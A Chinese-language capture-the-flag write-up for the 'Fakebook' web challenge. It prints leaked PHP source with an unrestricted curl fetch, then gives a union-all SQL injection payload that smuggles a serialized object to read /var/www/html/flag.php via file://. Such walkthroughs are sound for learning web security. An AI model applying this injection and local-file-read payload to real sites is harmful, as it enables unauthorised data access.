# buuoj_web_Fakebook
首先打开网页，先注册一个账户，信息随便填。
登陆之后发现username字段是一个链接，点击指向view.php?no=1

之后查看了一下robots.txt，发现user.php.bak。把源码下载下来，如下：
```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

回到view.php,先order by看一下表的列数,为4。然后就是正常的union注入，file协议读文件。但是union被过滤，这里使用union all绕过。
根据报错可知,view.php路径为/var/www/html/view.php,且需要传入序列化对象。
最后的payload是

```view.php?no=0%20union%20all%20select%201,2,3,%27O:8:"UserInfo":3:{s:4:"name";s:3:"hfs";s:3:"age";i:20;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27```

F12发现blog显示内容为base64编码，解码可得flag。
